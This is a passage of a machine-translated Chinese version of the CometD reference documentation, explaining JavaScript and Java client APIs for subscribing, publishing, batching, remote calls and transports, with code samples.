请记住，只有首次订阅频道时才会将订阅消息发送到服务器。 对同一频道的其他订阅不会导致将消息发送到服务器。 有关传递附加对象的更多信息，另请参阅javascript握手部分。

addListener（）和subscribe（）都返回对应用程序不透明的预订对象（即应用程序不应尝试使用此对象的字段，因为它的格式可能因CometD版本而异）。

返回的订阅对象应分别传递给removeListener（）和unsubscribe（）：

	// Some initialization code
	var subscription1 = cometd.addListener('/meta/connect', function() { ... });
	var subscription2 = cometd.subscribe('/foo/bar/', function() { ... });
	
	// Some de-initialization code
	cometd.unsubscribe(subscription2);
	cometd.removeListener(subscription1);

函数unsubscribe（）也可以将一个额外的对象和一个回调函数作为参数：

	// Some initialization code
	var subscription1 = cometd.subscribe('/foo/bar/', function() { ... });
	
	// Some de-initialization code
	var additional = {
	    com.acme.discard: true
	}
	cometd.unsubscribe(subscription1, additional, function(unsubscribeReply) {
	    // Your logic here.
	});

与subscribe（）类似，只有在最后一次从频道取消订阅时，取消订阅消息才会发送到服务器。有关传递附加对象的更多信息，另请参阅javascript握手部分。

听众和订阅者之间的主要区别在于订阅者在重新握手时会自动删除，而听众不会被重新握手修改。当客户端订阅一个频道时，服务器会维护客户端特定的服务器端订阅状态。如果服务器需要重新握手，则意味着它失去了该客户端的状态，因此也失去了服务器端订阅状态。为了保持客户端状态与服务器的状态一致，订阅（而不是侦听器）在重新握手时自动删除。

在代码中执行订阅的好地方是在/ meta / handshake函数中。由于/ meta /握手侦听器在客户端执行的显式握手中被调用，并且在重新握手服务器触发器时，保证您的订阅始终正确执行并与服务器状态保持一致。

同样，传递给handshake（）函数的回调函数的行为与/ meta / handshake监听器完全相同，因此可用于执行预订。

应用程序在重新握手的情况下不需要取消订阅; CometD库负责在重新握手时删除所有订阅，这样当/ meta / handshake函数再次执行时，订阅才能正确恢复（而不是重复）。

出于同样的原因，您不应该在/ meta / handshake函数中添加监听器，因为这会添加另一个监听器而不删除前一个监听器，从而导致多个相同消息的通知。

	var _reportListener;
	cometd.addListener('/meta/handshake', function(message) {
	    // Only subscribe if the handshake is successful
	    if (message.successful) {
	        // Batch all subscriptions together
	        cometd.batch(function() {
	            // Correct to subscribe to broadcast channels
	            cometd.subscribe('/members', function(m) { ... });
	
	            // Correct to subscribe to service channels
	            cometd.subscribe('/service/status', function(m) { ... });
	
	            // Messy to add listeners after removal, prefer using cometd.subscribe(...)
	            if (_reportListener) {
	                cometd.removeListener(_reportListener);
	                _reportListener = cometd.addListener('/service/report', function(m) { ... });
	            }
	
	            // Wrong to add listeners without removal
	            cometd.addListener('/service/notification', function(m) { ... });
	        });
	    }
	});

如果Bayeux服务器不可访问（由于网络故障或服务器崩溃），subscribe（）和unsubscribe（）行为如下：

- 在subscribe（）中，CometD首先将本地侦听器添加到该频道的订阅者列表中，然后尝试进行服务器通信。 如果通信失败，服务器不知道它必须将消息发送到该客户端，因此在客户端上，本地侦听器（尽管存在）不会被调用。

- 在取消订阅（）中，CometD首先从该频道的订阅者列表中删除本地侦听器，然后尝试进行服务器通信。 如果通信失败，服务器仍然将消息发送给客户端，但没有本地侦听器分派给该客户端。

###8.3.5. 动态重新订阅
很多时候，应用程序需要执行动态订阅和取消订阅，例如，当用户点击用户界面元素时，您想要订阅某个频道。 在这种情况下，订阅时返回的订阅对象被存储为能够根据用户需求动态地从频道取消订阅：

	var _subscription;
	function Controller() {
	    this.dynamicSubscribe = function() {
	       _subscription = cometd.subscribe('/dynamic', this.onEvent);
	    };
	
	    this.onEvent = function(message) {
	        ...
	    };
	
	    this.dynamicUnsubscribe = function() {
	        if (_subscription) {
	            cometd.unsubscribe(_subscription);
	            _subscription = undefined;
	        }
	    }
	}

在重新握手的情况下，动态订阅被清除（像任何其他订阅一样），并且应用程序需要确定哪个动态订阅必须再次执行。 CometD已经知道cometd.subscribe（...）被调用（在函数dynamicSubscribe（）中的上面），所以应用程序可以使用从subscribe（）获得的订阅对象调用resubscribe（）：

	cometd.addListener('/meta/handshake', function(message) {
	    if (message.successful) {
	        cometd.batch(function() {
	            // Static subscription, no need to remember the subscription handle
	            cometd.subscribe('/static', staticFunction);
	
	            // Dynamic re-subscription
	            if (_subscription) {
	                _subscription = cometd.resubscribe(_subscription);
	            }
	        });
	    }
	});

###8.3.6. 监听器和订阅者异常处理
如果侦听器或订阅者函数引发异常（例如，在未定义的对象上调用函数），则会在“debug”级别记录错误消息。 但是，有一种方法可以通过定义每次侦听器或订阅者抛出异常时调用的全局侦听器异常处理程序来拦截这些错误：
	
	cometd.onListenerException = function(exception, subscriptionHandle, isListener, message) {
	    // Uh-oh, something went wrong, disable this listener/subscriber
	    // Object "this" points to the CometD object
	    if (isListener) {
	        this.removeListener(subscriptionHandle);
	    } else {
	        this.unsubscribe(subscriptionHandle);
	    }
	}

可以从侦听器异常处理程序向服务器发送消息。 如果侦听器异常处理程序本身引发异常，则此异常会在“info”级别进行记录，并且CometD实现不会中断。 请注意，类似的机制存在于扩展中，请参阅扩展部分。

###8.3.7.通配符订阅
可以使用通配符同时订阅多个频道：
	cometd.subscribe("/chatrooms/*", function(message) { ... });

单个星号具有匹配单个通道段的含义; 在上面的示例中，它匹配频道/聊天室/ 12和/聊天室/ 15，但不匹配/聊天室/ 12 /上传。 要匹配多个通道段，请使用双星号：
	cometd.subscribe("/events/**", function(message) { ... });

双星号，通道/事件/股票/ FOO和/ events / forex / EUR匹配，以及/ events / feed和/ events / feed / 2009/08/03。

通配符机制也适用于监听器，因此可以如下监听所有元信道：
	cometd.addListener("/meta/*", function(message) { ... });

默认情况下，对全局通配符/ *和/ **的预订会导致错误，但您可以通过在Bayeux服务器上指定自定义安全策略来更改此行为。

###8.3.8. Meta 频道列表

以下是JavaScript CometD实现中可用的元信道：
- /meta/handshake
- /meta/connect
- /meta/disconnect
- /meta/subscribe
- /meta/unsubscribe
- /meta/publish
- /meta/unsuccessful

当JavaScript CometD实现处理对应的Bayeux消息时，会通知每个元信道。 / meta /不成功的频道会在发生任何失败时被通知

到目前为止，最感兴趣的元订阅渠道是/ meta / connect，因为它给出了当前与Bayeux服务器连接的状态。 结合使用/ meta / disconnect，例如，您可以使用它来在页面上显示绿色连接图标或红色断开连接的图标，具体取决于与Bayeux服务器的连接状态。

下面是使用/ meta / connect和/ meta / disconnect通道的常见模式：

	var _connected = false;

	cometd.addListener('/meta/connect', function(message) {
    	if (cometd.isDisconnected()) {
        	return;
    	}

    	var wasConnected = _connected;
    	_connected = message.successful;
    	if (!wasConnected && _connected) {
        	// Reconnected
    	} else if (wasConnected && !_connected) {
        	// Disconnected
    	}
	});

	cometd.addListener('/meta/disconnect', function(message) {
    	if (message.successful) {
        	_connected = false;
    	}
	}

/ meta / connect通道的一个小警告是/ meta / connect也用于轮询服务器。 因此，如果在活动轮询期间发出断开连接，服务器将返回活动轮询，并触发/ meta / connect侦听器。 在执行连接逻辑之前，状态的初始检查证实情况并非如此。

元信道的另一个有趣用途是在握手过程中有一个认证步骤。 在这种情况下，注册到/ meta / handshake频道可以给出关于例如认证失败的细节。

8.4. 发送信息
-------------

CometD 允许您用以下三种方式发送信息：

1.发布/订阅：您在广播频道上发布消息，以便订阅者接收消息
2.点对点：您将消息发布到服务通道上，以便特定收件人接收消息
3.远程过程调用：您远程调用服务器上的目标以执行操作，并接收回应

对于第一种和第二种情况，使用的API是publish（）。 对于第三种情况，使用的API是remoteCall（）。

CometD还允许应用程序发送包含二进制数据的消息。 这种情况是通过使用API的publishBinary（）和remoteCallBinary（）变体来支持的。

###8.4.1. Publishing

publish（）函数允许您将数据发布到某个频道上：
	
	cometd.publish('/mychannel', { mydata: { foo: 'bar' } });

您不能（也没有意义）发布到元信道，但即使您未订阅该频道，也可以发布到服务或广播频道。 但是，在发布之前，您必须握手（详见握手章节）。

与其他JavaScript CometD API一样，publish（）涉及与服务器的通信，并且它是异步的：在Bayeux服务器收到消息之前，它立即返回。

当您发布的消息到达服务器时，服务器使用发布确认回复客户端; 这允许客户端确保消息到达服务器。 发布确认以消息发布到的同一频道到达，具有相同的消息ID和成功的字段。 如果由于某种原因发布消息失败，例如因为无法访问服务器，则会发布发布失败，与发布确认类似。

出于历史原因，即使/ meta / publish频道不是Bayeux协议的一部分，发布确认和失败也会通过/ meta / publish频道（仅在JavaScript库中）通知。

为了得到发布确认或失败的通知，是否建议您使用publish（）函数的这个变体，并传递一个回调函数：
	
	cometd.publish('/mychannel', { mydata: { foo: 'bar' } }, function(publishAck) {
    if (publishAck.successful) {
        // The message reached the server
    }
	});

>注意：
>
>调用publish（）并不意味着publish（）返回时您已发布消息。

如果您需要发布多条消息，可能会发布到不同的渠道，您可能需要使用javascript批量部分。

当您发布到广播频道时，服务器将自动向该频道的所有订阅者发送消息。 这是发布/订阅消息传递风格。

当您发布到服务通道时，服务器将收到消息，但消息旅程将在服务器上结束，并且消息不会传递到任何远程客户端。 该消息应包含消息收件人的特定于应用程序的标识符，以便服务器上的应用程序特定代码可以提取此标识符并将消息传递给该特定收件人。 这是点对点消息传递风格。

###8.4.2. 发布二进制数据

您可以使用专门的publishBinary（）API发布二进制数据。 存在一个类似的专用API来用二进制数据执行远程调用。

请记住，您必须按照二进制扩展部分中的说明启用二进制扩展。

要发布二进制数据，您必须先创建或获取JavaScript类型数组，DataView或ArrayBuffer，然后使用publishBinary（）API：


	// Create an ArrayBuffer.
	var buffer = new ArrayBuffer(4);

	// Fill it with the bytes.
	var view = new DataView(buffer);
	view.setUint8(0, 0xCA);
	view.setUint8(1, 0xFE);
	view.setUint8(2, 0xBA);
	view.setUint8(3, 0xBE);

	// Send it.
	cometd.publishBinary('/binary', view, true, { prolog: 'java' });

在上面的例子中，要发送的二进制数据可以是缓冲区或视图。 publishBinary（）的第三个参数是表示二进制数据是否为最后一个块的最后一个参数; 当省略时，它默认为true。 publishBinary（）的第四个参数是将附加信息与二进制数据相关联的元参数，可以省略。

与普通的publish（）调用类似，您可以将publishBinary（）作为最后一个参数传递给publishBill（）函数，该函数会通知发布确认。

###8.4.3. 远程呼叫

当您只需要调用服务器执行某些操作（例如从数据库检索数据或更新某个服务器状态）时，就需要使用远程调用：

	cometd.remoteCall('target', { foo: 'bar' }, 5000, function(response) {
    if (response.successful) {
        // The action was performed
        var data = response.data;
    }
	});



remoteCall（）的第一个参数是远程调用的目标。您可以将其视为在服务器上调用的方法名称，或者您可以将其视为您要执行的操作。它可能有也可能没有前导/字符，并可能由多个部分组成，如目标/子目标。

remoteCall（）的第二个参数是一个包含远程调用参数的对象。您可以将其视为远程方法调用的参数，将其指定为对象，或者您可以将其视为执行操作所需的数据。

remoteCall（）的第三个可选参数是远程调用完成的超时时间（以毫秒为单位）。如果超时到期，回调函数将被调用，其响应对象的成功字段设置为false，并且其错误字段被设置为'406 :: timeout'。超时的缺省值是由maxNetworkDelay参数指定的值。负值或0会禁用超时。

remoteCall（）的最后一个参数是在远程调用返回时或者它失败时（例如由于网络故障）或者超时时调用的回调函数。

下表显示了在传递给回调的响应对象中存在哪些响应字段，在以下情况下：

| 情况        | response.successful	    |response.data	    |response.error
| --------   | -----:   | :----: |:----: 
| Action performed successfully by the server| true      |  action data from the server     |N/A
| Action failed by the server(for example, exception thrown)        | false      |   failure data from the server    |N/A
| Network failure | false      |   N/A    |N/A
| Timeout        | false      |   N/A    |'406::timeout'


在内部，远程调用被转换为发布到服务通道的消息，并通过注释服务在服务器端处理，特别是带有@RemoteCall注释的服务。

但是，由于CometD执行请求和响应之间的关联以及错误处理，因此远程调用比服务渠道更简单。 通过这种方式，应用程序可以使用更简单的API。


###8.4.4. 使用二进制数据远程调用

与发布二进制数据类似，可以在执行远程调用时发送二进制数据。

请记住，您必须在二进制扩展部分指定的客户端中启用二进制扩展。

这里是一个发送ArrayBuffer的例子：

	// Obtain an ArrayBuffer.
	var buffer = ...;
	var meta = {
    	contentType: "application/pdf"
	};
	cometd.remoteCallBinary('target', buffer, true, meta, function(response) {
    	if (response.successful) {
        	// The action was performed
        	var data = response.data;
    	}
	});

8.5. 断开
---------

在网络或Bayeux服务器发生故障的情况下，JavaScript CometD会实现自动重新连接。 javascript配置部分描述了重新连接参数。

调用JavaScript CometD API disconnect（）会导致将消息发送到Bayeux服务器，以便它可以清理与该客户端关联的任何状态。与涉及与Bayeux服务器通信的所有功能一样，它也是一个异步功能：它在Bayeux服务器收到断开请求之前立即返回。如果服务器无法访问（因为它已关闭或因网络故障），JavaScript CometD实现将停止任何重新连接尝试并清除任何本地状态。忽略disconnect（）调用是否成功通常是安全的：客户端在任何情况下都是断开的，其本地状态已被清除，并且如果服务器还没有到达，它最终会超时客户端并清除任何该客户端的服务器端状态。

>注意：
>如果您使用Firebug调试您的应用程序，并且关闭了服务器，您会在Firebug控制台中看到重新尝试连接的尝试。 要停止这些尝试，请输入Firebug命令行：dojox.cometd.disconnect（）（用于Dojo）或$ .cometd.disconnect（）（用于jQuery）。

如果您确实想知道服务器是否接收到断开请求，则可以将回调函数传递给disconnect（）函数：


	cometd.disconnect(function(disconnectReply) {
    	if (disconnectReply.successful) {
        	// Server truly received the disconnect request
    	}
	});

像其他API一样，disconnect（）也可能需要一个发送给服务器的附加对象：

	var additional = {
    	com.acme.reset: false
	};
	cometd.disconnect(additional, function(disconnectReply) {
    	// Your logic here.
	});

有关传递附加对象的更多信息，详见javascript握手章节。

###8.5.1 短网络故障

在临时网络故障的情况下，客户端会通过/ meta / connect通道（详见有关元信道的javascript订阅章节）通知成功字段设置为false的消息（另请参阅引言章节中的原型作为实例）。 然而，Bayeux服务器可能能够保持客户端的状态，并且当网络恢复时，Bayeux服务器可能表现得好像什么也没有发生。 在这种情况下，客户端只是重新建立长期轮询，但客户端在网络故障期间发布的任何消息都不会自动重新发送（尽管可以通过/ meta / publish频道或更好地通过回调方程来通知发布失败）。

###8.5.2. 长网络故障或服务器故障

如果网络故障足够长时间，Bayeux服务器会因为超时丢失客户端，并删除与之关联的状态。 Bayeux服务器崩溃时会发生同样的情况（除了所有客户端的状态丢失外）。 在这种情况下，客户端上的重新连接机制执行以下步骤：

- 长时间轮询被重新尝试，但服务器拒绝402 :: Unknown客户端错误消息。
- 尝试握手，服务器通常会接受并分配一个新的客户端。
- 重新握手成功后，重新进行长期调查。

如果您注册元通道监听器，或者如果您使用回调函数，请注意这些步骤，因为重新连接可能涉及与服务器的多个消息交换。

8.6. 消息批处理
--------------

通常，应用程序需要将几条消息发送到不同的通道。 一个简单的做法如下：

	// Warning: non-optimal code
	cometd.publish('/channel1', { product: 'foo' });
	cometd.publish('/channel2', { notificationType: 'all' });
	cometd.publish('/channel3', { update: false });

您可能会认为这三份出版物会一个接一个地留下客户，但事实并非如此。请记住，publish（）是异步的（它会立即返回），所以在单个字节到达网络之前，三个publish（）调用可能会很好地返回。第一个publish（）立即执行，另外两个在队列中，等待第一个publish（）完成。当服务器接收到它时，发布（）完成，发回元响应，客户端收到该发布的元响应。当第一次发布完成时，第二次发布将被执行并等待完成。之后，第三个发布（）最终执行。

如果将名为autoBatch的配置参数设置为true，则实现会自动批量排队的消息。在上面的例子中，第一个publish（）立即执行，当它完成时，实现将第二个和第三个publish（）分配到一个到服务器的请求中。 autoBatch功能对于那些异步和不可预测地收到事件（无论是以快速还是突发）最终生成发布到服务器的系统很有用：在这种情况下，使用批处理API不是有效的（因为每个事件只会生成一个发布（））。客户端上的突发事件会向服务器产生一连串的publish（），但自动批处理机制会自动对它们进行批处理，从而使通信更加高效。

排队机制避免在长轮询后面排队publish（）。如果不是这种机制，浏览器会收到三个发布请求，但它只有两个可用的连接，并且一个已经被长轮询请求占用。因此，浏览器可能决定对发布请求进行循环，以便第一次发布进入第二次连接，这是免费的，并且实际上是通过网络发送的（请记住，第一次连接已经忙于长时间轮询请求），将第二次发布安排到第一次连接（在长时间轮询返回后），并在第一次发布返回后再次将第三次发布安排到第二次连接。结果是，如果您的轮询超时时间长达五分钟，则第二个发布请求可能会比第一个和第三个发布请求迟五分钟到达服务器。

您可以使用批处理优化三个发布，这是一种将消息分组在一起的方式，以便单个Bayeux消息实际上携带三个发布消息。

	cometd.batch(function() {
    cometd.publish('/channel1', { product: 'foo' });
    cometd.publish('/channel2', { notificationType: 'all' });
    cometd.publish('/channel3', { update: false });
	});

	// Alternatively, but not recommended:
	cometd.startBatch()
	cometd.publish('/channel1', { product: 'foo' });
	cometd.publish('/channel2', { notificationType: 'all' });
	cometd.publish('/channel3', { update: false });
	cometd.endBatch()

请注意，三个publish（）调用现在是如何传递给batch（）的。

另外，但不太推荐，可以围绕startBatch（）和endBatch（）之间的三个publish（）调用。

>注意：
>注意在调用startBatch（）之后调用endBatch（）。 如果你不这样做 - 例如，因为在批处理中引发异常 - 你的消息会继续排队，并且你的应用程序不能按预期工作。

如果您仍想冒着使用startBatch（）和endBatch（）调用的风险，请记住，您必须从相同的执行上下文中执行此操作; 消息批量还没有被设计为跨越多个用户交互。 例如，在functionA中启动一个批处理（由用户交互触发），并在functionB中结束批处理（也由用户交互触发并且未由functionA调用）是错误的。 同样，在函数A中启动一个批处理，然后调度（使用setTimeout（））函数B的执行来结束批处理是错误的。 函数batch（）已经为你做了正确的批处理（在发生错误的情况下），所以它是推荐的消息批处理方式。

批处理启动时，后续API调用不会发送到服务器，而是排队直到批处理结束。 批处理结束后，将所有排队的消息打包成一个Bayeux消息，并通过网络将其发送到Bayeux服务器。

消息批处理允许有效地使用网络：而不是提出三个请求/响应周期，批处理只产生一个请求/响应周期。

批可以由不同的API调用组成：

	var _subscription;
	cometd.batch(function() {
    	cometd.unsubscribe(_subscription);
    	_subscription = cometd.subscribe('/foo', function(message) { ... });
    	cometd.publish('/bar', { ... });
	});

Bayeux服务器按照它们发送的顺序处理分批消息。

8.7. JavaScript 传输
-------------------

Bayeux协议部分定义了两个强制性传输：长轮询和回调轮询。

JavaScript CometD实现实现了这两个传输并支持websocket传输（基于HTML 5 WebSocket）。

>注意：
>在撰写本文时，IETF已经将WebSocket协议定稿为RFC 6455.然而，大多数浏览器仍然实现了早期的WebSocket协议草案，因此浏览器支持各不相同（最值得注意的是，Microsoft的Internet Explorer仅支持WebSocket脱离 在版本10中）。 如果websocket传输不起作用，cometD会回到长轮询状态。

###8.7.1. 长轮询运输


如果浏览器和服务器不支持WebSocket，则长轮询传输是默认传输。 当与Bayeux服务器的通信发生在同一个域上时，以及在最近的浏览器（例如Firefox 3.5+）的跨域模式（另请参阅cross origin部分）中使用此传输。 通过一个带有Content-Type：application / json; charset = UTF-8的POST请求，通过简单的XMLHttpRequest调用将数据发送到服务器。


###8.7.2. 回调轮询传输


当与Bayeux服务器的通信发生在不同的域上并且不支持跨域模式时（参见cross origin部分），将使用回调轮询传输。

当调用被定向到与脚本已下载到的域不同的域时，JavaScript XMLHttpRequest对象用于具有限制。

最近的浏览器现在实现了一个支持跨域调用的XMLHttpRequest对象版本，但为了使调用成功，服务器必须协作，通常通过部署跨源Servlet过滤器来进行协作。

如果旧版浏览器或服务器未部署跨源解决方案，则回调轮询传输将使用JSONP脚本注入，该脚本注入的src属性指向Bayeux服务器的script元素。浏览器注意脚本元素注入并对指定的源URL执行GET请求。 Bayeux服务器知道这是一个JSONP请求，并用浏览器执行的JavaScript函数回复（并回调到CometD实现中）。

使用这种运输方式有三个主要缺点：

- 运输很干净。这是由于浏览器按顺序执行注入的脚本，直到脚本完全“下载”，它不能执行。例如，设想一个涉及长轮询的脚本注入的通信，以及用于发布消息的脚本注入。浏览器注入长轮询脚本，向Bayeux服务器发出请求，但Bayeux服务器持有请求等待服务器端事件（因此脚本未下载）。然后浏览器注入发布脚本，请求发送到Bayeux服务器，该服务器回复（以便下载脚本）。但是，浏览器不执行第二个脚本，因为它尚未执行第一个脚本（因为它的下载没有完成）。在这些情况下，发布只有在长期民意调查返回后才会执行。为了避免这种情况，在回调轮询传输的情况下，Bayeux服务器恢复客户端对从该客户端到达的每个消息的长期轮询，这就是为什么传输更加烦人：长期轮询更频繁地返回。
- 消息大小有限。 这对于支持IE7（对GET请求有2083个字符限制）是必需的。
- 对故障的反应较慢。这是因为如果脚本注入指向一个返回错误的URL（例如，Bayeux服务器关闭），浏览器将自动忽略该错误。

###8.7.3. websocket 传输

如果浏览器和服务器支持WebSocket，则websocket传输可用。 WebSocket协议被设计为网络的双向通信协议，所以它在CometD项目中非常合适。

启用/禁用websocket传输的最简单方法是在执行初始CometD握手之前设置一个布尔变量：

	var cometd = dojox.cometd; // Dojo style
	var cometd = $.cometd; // jQuery style

	// Disable the websocket transport
	cometd.websocketEnabled = false;

	// Initial handshake
	cometd.init('http://localhost:8080/cometd');

禁用websocket运输的另一种方法是取消注册其传输，详见传输注销章节。

>注意：
>请记住，启用客户端上的websocket传输是不够的：您还必须在服务器上启用它。 按照服务器传输部分在服务器上配置websocket。

###8.7.4. 取消注册传输

CometD JavaScript传输被添加到CometD JavaScript库的JavaScript工具包绑定中。

CometD JavaScript API允许您取消注册传输，这对强制仅使用一个传输（例如，用于测试目的）或禁用某些可能不可靠的传输非常有用。 例如，可以通过使用以下代码取消注册WebSocket传输来取消注册：
	var cometd = dojox.cometd; // Dojo style
	var cometd = $.cometd; // jQuery style

	cometd.unregisterTransport('websocket');

###8.7.5. 跨源模式

最近的浏览器引入了针对不同域执行XMLHttpRequest调用的功能（请参阅HTTP访问控制）。 如果浏览器支持XMLHttpRequest跨域调用，CometD使用它们，并且在服务器上进行了一些配置，JavaScript CometD实现也支持这一功能，在本节中进行了解释。

要使用跨域模式，您需要：
- 跨网域兼容的浏览器。
- 兼容的服务器（例如，使用CrossOriginFilter配置的Jetty）。

通过这种设置，即使与Bayeux服务器的通信是跨域的，CometD也使用长轮询传输，避免了回调轮询传输的缺点。


9.Java 包
==========
CometD Java实现基于流行的Jetty Http服务器和Servlet容器，用于客户端和服务器，版本9或更高版本。

9.1.CometD Java库和Servlet 3.0
-----------------------------

CometD Java实现虽然基于Jetty，但基于标准Servlet 3.0 API，因此可以部署到任何符合Servlet 3.0的Servlet容器，并利用Servlet容器提供的异步功能。 有关更多详细信息，另请参阅Servlet 3.0配置部分。

CometD Java实现提供了一个客户端库和一个服务器库，以下各节详细介绍了这些库。


9.2. 客户端 Library
------------------

您可以在任何JSE™或JEE™应用程序中使用CometD客户端实现。 它由一个主类org.cometd.client.BayeuxClient组成，它实现了org.cometd.bayeux.client.ClientSession接口。

CometD Java客户端的典型用途包括：
- 传输丰富的Java UI（例如Swing或Android）以与Bayeux服务器通信（也可以通过防火墙）。
- 一个负载生成器来模拟数千个CometD客户端，例如org.cometd.benchmark.client.CometDLoadClient

以下部分提供了有关Java BayeuxClient API及其实现秘密的详细信息。

###9.2.1. 握手

要启动与Bayeux服务器的通信，您需要调用：
	
	BayeuxClient client = ...;
	client.handshake()

下面是一个典型的用法：

	// Create (and eventually set up) Jetty's HttpClient:
	HttpClient httpClient = new HttpClient();
	// Here set up Jetty's HttpClient, for example:
	// httpClient.setMaxConnectionsPerDestination(2);
	httpClient.start();

	// Prepare the transport
	Map<String, Object> options = new HashMap<String, Object>();
	ClientTransport transport = new LongPollingTransport(options, httpClient);

	// Create the BayeuxClient
	ClientSession client = new BayeuxClient("http://localhost:8080/cometd", transport);

	// Here set up the BayeuxClient, for example:
	// client.getChannel(Channel.META_CONNECT).addListener(new ClientSessionChannel.MessageListener() { ... });

	// Handshake
	client.handshake();

BayeuxClient必须实例化，传递Bayeux服务器的绝对URL（因此包括方案，主机，可选的端口和路径）。 URL的方案必须始终为“http”或“https”。 在使用WebSocket协议的情况下，CometD Java Client实现将透明地将该方案转换为“ws”或“wss”。

一旦调用了握手（）之后，除非已通过调用disconnect（）明确断开连接，否则不得再次调用handshake（）。

当调用handshake（）时，BayeuxClient执行与Bayeux服务器的握手，并异步建立长轮询连接。

>注意
>调用handshake（）并不意味着握手（）返回时已完成与服务器的握手。

要验证握手是否成功，可以将回调MessageListener传递给BayeuxClient.handshake（）：

	ClientTransport transport = ...
	ClientSession client = new BayeuxClient("http://localhost:8080/cometd", transport);
	client.handshake(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	if (message.isSuccessful()) {
            	// Here handshake is successful
        	}
    	}
	});

另一种等效的方法是在调用BayeuxClient.handshake（）之前添加MessageListener：


	ClientTransport transport = ...
	ClientSession client = new BayeuxClient("http://localhost:8080/cometd", transport);
	client.getChannel(Channel.META_HANDSHAKE).addListener(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	if (message.isSuccessful()) {
            	// Here handshake is successful
        	}
    	}
	});
	client.handshake();


另一种选择是使用BayeuxClient的内置同步功能并等待握手完成：

	ClientTransport transport = ...
	BayeuxClient client = new BayeuxClient("http://localhost:8080/cometd", transport);
	client.handshake();
	boolean handshaken = client.waitFor(1000, BayeuxClient.State.CONNECTED);
	if (handshaken) {
    	// Here handshake is successful
	}

BayeuxClient.waitFor（）方法等待BayeuxClient达到给定状态的给定超时（以毫秒为单位），如果在超时到期之前达到状态，则返回true。

###9.2.2. 订阅和退订

以下部分提供有关订阅和取消订阅频道的信息。

####9.2.2.1. 订阅广播频道

订阅（或取消订阅）涉及首先检索您要订阅（或取消订阅）的频道，然后调用subscribe（）（或unsubscribe（））方法：

	public class Example {
    	private static final String CHANNEL = "/foo";
    	private final ClientSessionChannel.MessageListener fooListener = new FooListener();

    	public void attach() {
        	ClientTransport transport = ...
        	ClientSession client = new BayeuxClient("http://localhost:8080/cometd", transport);
        	client.handshake();
        	boolean handshaken = client.waitFor(1000, BayeuxClient.State.CONNECTED);
        	if (handshaken) {
            	client.getChannel(CHANNEL).subscribe(fooListener);
        	}
    	}

    	private static class FooListener implements ClientSessionChannel.MessageListener {
        	public void onMessage(ClientSessionChannel channel, Message message) {
            	// Here you received a message on the channel
        	}
    	}
	}

>注意
>您只能在握手完成后才能订阅和取消订阅。 调用subscribe（）（或unsubscribe（））并不意味着您在方法返回时已完成对服务器的订阅（或取消订阅）。

取消订阅非常简单：如果您取消订阅频道，CometD不会将该频道上的留言传递给留言听众。 使用上面的Example类：

	public class Example {
    	...
    	public void detach() {
        	client.getChannel(CHANNEL).unsubscribe(fooListener);
    	}
	}

如果您需要知道您的订阅（或取消订阅）是否由服务器接收和处理，则可以将回调MessageListener传递给subscribe（）（或unsubscribe（））方法：

	final BayeuxClient client = ...;
	final ClientSessionChannel.MessageListener messageHandler = ...;
	client.handshake(new ClientSessionChannel.MessageListener() {
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	if (message.isSuccessful()) {
            	// Subscribe
            	client.getChannel("/foo").subscribe(messageHandler, new ClientSessionChannel.MessageListener() {
                	public void onMessage(ClientSessionChannel channel, Message message) {
                    	if (message.isSuccessful()) {
                        	// Subscription successful.
                    	}
                	}
            	}
        	}
    	}
	});


与JavaScript订阅章节一样，执行订阅的优点是握手（...）回调或/ meta /握手监听器，因为如果服务器请求新的握手，它们将被透明地调用。

应用程序在重新握手的情况下不需要取消订阅; CometD库在重新握手时删除订阅，这样当/ meta /握手监听程序再次执行时，订阅才能正确恢复（而不是重复）。


####9.2.2.2. 监听 Meta 频道

Bayeux协议的内部实现使用元信道，订阅它们没有任何意义，因为它们不是广播信道。 但是，听取那些到达这些频道的消息确是有意义的。


	public class Example {
    	public void init() {
        	ClientSession client = ...;
        	client.getChannel(Channel.META_HANDSHAKE).addListener(new ClientSessionChannel.MessageListener() {
            	public void onMessage(ClientSessionChannel channel, Message message) {
                	// Here you received a handshake response message
            	}
        	});
    	}
	}

###9.2.3. 发送信息

CometD 允许您用以下两种方式发送信息:

- 通过发布消息到一个频道
- 通过执行远程过程调用

第一种情况由ClientSessionChannel.publish（）API覆盖。 第二种情况由ClientSession.remoteCall（）API覆盖。


####9.2.3.1. 发布

以下是在频道上发布消息的典型示例：

	ClientTransport transport = ...
	ClientSession client = new BayeuxClient("http://localhost:8080/cometd", transport);
	client.handshake();

	Map<String, Object> data = new HashMap<String, Object>();
	// Fill in the data

	ClientSessionChannel channel = client.getChannel("/game/table/1");
	channel.publish(data);

在频道上发布数据是一种异步操作。

当您发布的消息到达服务器时，服务器返回发布确认消息回复客户端; 这允许客户端确认消息到达服务器。 发布确认消息到达发布消息的同一频道，他们具有相同的消息ID和成功的字段。 如果消息发布由于任何原因而失败，例如无法到达服务器，则会返回发布失败，类似于发布确认。

为了得到发布确认或失败的通知，可以使用publish（）方法的这种变体：

	Map<String, Object> data = new HashMap<String, Object>();
	/ Fill in the data

	client.getChannel("/game/table/1").publish(data, new ClientSessionChannel.MessageListener() {
    	@Override
    	public void onMessage(ClientSessionChannel channel, Message message) {
        	if (message.isSuccessful()) {
            	// The message reached the server
        	}
    	}
	});


调用publish（）并不意味着publish（）方法返回时您已发布消息。
消息批处理也是可用的：

	final ClientSession client = ...;
	client.handshake();

	client.batch (new Runnable() {
    	public void run() {
        	Map<String, Object> data1 = new HashMap<String, Object>();
        	// Fill in the data1 map object
        	client.getChannel("/game/table/1").publish(data1);

        	Map<String, Object> data2 = new HashMap<String, Object>();
        	// Fill in the data2 map object<
        	client.getChannel("/game/chat/1").publish(data2);
    	}
	});

>注意
>ClientSession API还允许批量使用startBatch（）和endBatch（），但请记住在调用startBatch（）之后调用endBatch（），例如在finally块中。 如果您不这样做，您的邮件会继续排队，并且您的应用程序无法按预期工作。

####9.2.3.2.  发布二进制数据

您可以使用org.cometd.bayeux.BinaryData类发送二进制数据，例如byte []或ByteBuffer。

请记住，您必须按照二进制扩展章节中的说明启用二进制扩展。


	ClientSession client = ...;
	client.handshake();

	byte[] bytes = ...;
	client.getChannel("/channel").publish(new BinaryData(bytes, true, null));

如概念章节所述，CometD负责将BinaryData对象转换为正确的格式，并将二进制扩展添加到消息中。

####9.2.3.3. Remote Calls

